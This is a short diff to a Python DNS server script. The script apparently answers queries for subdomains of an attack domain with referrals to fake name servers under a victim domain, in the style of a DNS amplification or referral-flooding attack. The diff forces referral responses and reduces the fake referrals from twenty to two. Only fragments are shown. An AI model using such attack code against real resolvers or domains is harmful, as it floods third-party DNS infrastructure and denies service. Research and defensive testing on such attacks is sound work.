@@ -80,7 +80,7 @@ def dns_response(data, client_ip):
         reply.add_auth(RR(rname=attack_domain, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))
 
     elif qn.endswith('.' + attack_domain):  # NXDomain
-        val = 1  # random.choice([0, 1])
+        val = 0  # random.choice([0, 1])
         if val == 0:
             for rdata in referral_responses:
                 reply.add_auth(RR(rname=attack_domain, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
@@ -188,7 +188,7 @@ def main():
 
 
 if __name__ == '__main__':
-    for i in range(1, 21):
+    for i in range(1, 3):
         dom = 'fake-' + str(i) + '.' + victim_domain
         referral_responses.append(NS(dom))
     main()
